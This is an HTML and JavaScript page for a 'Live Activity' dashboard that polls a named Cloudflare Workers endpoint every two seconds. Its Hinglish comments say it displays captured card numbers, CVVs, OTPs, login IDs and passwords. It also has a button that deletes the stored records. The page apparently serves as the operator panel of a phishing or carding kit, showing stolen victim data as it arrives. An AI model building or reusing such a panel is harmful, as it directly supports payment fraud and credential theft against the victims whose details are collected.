<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>B&W Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        
        body { background-color: #000; color: #fff; padding-bottom: 80px; }

        /* Header */
        .header {
            background: #000;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #222;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .header h1 { font-size: 14px; letter-spacing: 3px; color: #666; text-transform: uppercase; }
        
        /* Visit Count Badge */
        .v-badge {
            background: #fff;
            color: #000;
            padding: 5px 20px;
            border-radius: 2px;
            font-weight: 900;
            font-size: 24px;
        }

        .container { padding: 15px; display: flex; flex-direction: column; gap: 12px; }

        /* Data Row (Card, OTP, Login sab ke liye) */
        .data-row {
            background: #000;
            padding: 20px;
            border: 1px solid #333;
            border-left: 6px solid #fff; 
            font-size: 18px;
            font-weight: 800;
            color: #fff;
            white-space: pre-wrap; /* \n ko support karta hai */
            line-height: 1.8; 
            word-break: break-all;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }

        /* Delete Button */
        .btn-clear {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-weight: 900;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            box-shadow: 0 0 10px rgba(255,0,0,0.4);
        }

        .sync { text-align: center; font-size: 9px; color: #333; margin-top: 30px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="header">
        <h1>Live Activity</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div class="container" id="logsDisplay">
        </div>

    <button class="btn-clear" onclick="clearData()">CLEAR ALL</button>
    <div class="sync">D1 CONNECTED • AUTO-REFRESH 2S</div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function refresh() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                if (!data) return;

                // Update Total Count
                badge.innerText = data.length;

                // Filter and Render
                let htmlContent = data.map(log => {
                    // VISIT data ko hide rakho, baki sab dikhao
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                        return ""; 
                    }

                    // Card, CVV, ID, Pass sab isme line-by-line dikhenge
                    return `<div class="data-row">${log.detail}</div>`;
                }).join('');

                display.innerHTML = htmlContent;

            } catch (e) { console.log("Reconnecting..."); }
        }

        // Database saaf karne ka function
        async function clearData() {
            if(confirm("Bhai, saara data uda dein?")) {
                await fetch(workerURL, { method: 'DELETE' });
                location.reload();
            }
        }

        setInterval(refresh, 2000);
        window.onload = refresh;
    </script>
</body>
</html>
